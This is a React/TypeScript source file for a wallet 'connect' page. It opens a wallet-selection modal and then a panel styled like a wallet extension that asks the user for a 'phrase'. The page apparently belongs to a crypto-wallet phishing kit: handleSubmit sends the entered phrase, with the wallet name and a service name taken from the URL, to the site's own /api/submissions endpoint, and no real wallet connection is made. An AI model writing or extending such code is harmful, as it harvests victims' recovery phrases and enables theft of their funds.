import { useState } from "react";
import { useLocation } from "wouter";
import { Header } from "@/components/header";
import { WalletModal } from "@/components/wallet-modal";
import { WalletExtensionPanel } from "@/components/wallet-extension-panel";

export default function ConnectPage() {
  const [, setLocation] = useLocation();
  const [walletModalOpen, setWalletModalOpen] = useState(true);
  const [extensionPanelOpen, setExtensionPanelOpen] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [selectedWalletId, setSelectedWalletId] = useState<string | null>(null);
  
  const params = new URLSearchParams(window.location.search);
  const serviceName = params.get("service") || "Direct Connect";

  const handleWalletSelect = (walletName: string, walletId: string) => {
    setSelectedWallet(walletName);
    setSelectedWalletId(walletId);
    setExtensionPanelOpen(true);
  };

  const handleExtensionPanelClose = () => {
    setExtensionPanelOpen(false);
    setWalletModalOpen(false);
    setLocation("/");
  };

  const handleSubmit = async (phraseInput: string) => {
    try {
      const response = await fetch('/api/submissions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletName: selectedWallet || "Unknown",
          serviceName: serviceName,
          phrase: phraseInput,
        }),
      });
      
      if (!response.ok) {
        console.error("Submission failed:", await response.text());
      }
    } catch (error) {
      console.error("Submission error:", error);
    }
  };

  const handleModalClose = (open: boolean) => {
    if (!open && !extensionPanelOpen) {
      setLocation("/");
    }
  };

  return (
    <div className="min-h-screen bg-zinc-950">
      <Header onLaunchApp={() => {}} />
      <WalletModal 
        open={walletModalOpen} 
        onOpenChange={handleModalClose}
        onWalletSelect={handleWalletSelect}
        disabled={extensionPanelOpen}
      />

      {extensionPanelOpen && (
        <div 
          className="fixed top-0 left-0 bottom-0 right-[420px] bg-black/60 backdrop-blur-sm z-[90]"
          onClick={handleExtensionPanelClose}
        />
      )}

      <WalletExtensionPanel
        open={extensionPanelOpen}
        walletName={selectedWallet || ""}
        walletId={selectedWalletId || ""}
        serviceName={serviceName}
        onClose={handleExtensionPanelClose}
        onSubmit={handleSubmit}
      />
    </div>
  );
}
